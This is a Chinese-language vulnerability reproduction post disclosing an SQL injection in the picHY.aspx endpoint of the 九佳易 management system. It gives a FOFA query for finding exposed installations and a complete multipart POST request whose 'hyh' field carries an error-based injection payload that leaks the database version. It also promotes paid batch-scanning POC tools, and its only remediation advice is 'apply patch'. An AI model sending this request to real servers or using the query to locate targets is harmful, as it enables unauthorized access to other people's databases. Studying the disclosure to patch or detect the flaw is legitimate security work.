#  九佳易管理系统picHY.aspx接口存在SQL注入漏洞 附POC  
2026-2-27更新
                    2026-2-27更新  南风漏洞复现文库   2026-02-27 15:47  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 九佳易管理系统简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
九佳易管理系统  
## 2.漏洞描述  
  
九佳易管理系统picHY.aspx接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
九佳易管理系统  
![九佳易管理系统picHY.aspx接口存在SQL注入漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6zuVgMtEK1BEiaDj257q9g4cd2p20FqF9q4Y2uhibCjS85ElV8qD3rzOG4Njwp4aKfiaaXOsKwsibJSfpict3b3eL8BW5oVl701IOs0/640?wx_fmt=png&from=appmsg "null")  
  
九佳易管理系统picHY.aspx接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
title="VSQL" && body="/Scripts/Login_A8/"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xxx.xx/HuiYuan/HuiYuanDangAn/picHY.aspx  
  
漏洞数据包：  
```
POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 111

------WebKitFormBoundary
Content-Disposition: form-data; name="hyh"

'-1/@@version--
------WebKitFormBoundary--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wMm8hD2ULFgyRAXnVvNDw4zMwBXQmgw8RxMA0BL1dCEK1TmqQp8MyibIOia9cwnyfxGibyxicdJlqG3Jgw3jCSZPgWMgSU70mIfPY/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zAc7qdTdq0JfqCTQKcfzVpdzXBw4PYEC9QAhjblVvNtbrqA2GszibcaEUticfXG70rpq4BxjrDYD7iaCuovW1GhdbaEjtolVib0gs/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wkic5ibQcyvgecgPc5I7KarJ4dP4Sfow1ftFB7cAYGvfMxwzuV61Ghxic1x6icLL7bIclZNiby7hprQHUaOVicSymqcmT0agjibXrQaY/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6z1Umt1z3gWuWaNS0D3c38sBFbjakIvR1cxuaAiaqLCO4No9qicCQXW7WT4jcRy5RLLgvcjsaX8BWobHGUIUP3woUah23RTHPBcQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wzcNgwTCialqaTJKC8T3D1q1m5JHqRfrpiaScXS3cg0dszawlDEx4HMePdntXHwpwn6yFf4TVhMUMnFLqJsDWw6nh4Cia4p9qlJo/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zicdXtYZic1HDRWFdpBl1LRxNtqgSS0Dibj0tRiaAYG4GyWibZj5CuZE2KV9Q07zE2nic97FyvVeYQuA1SnGq4RiayibIfbweESc33pGA/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
